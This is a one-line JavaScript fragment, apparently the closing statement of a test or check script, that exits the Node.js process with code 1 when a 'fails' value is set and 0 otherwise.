process.exit(fails ? 1 : 0);
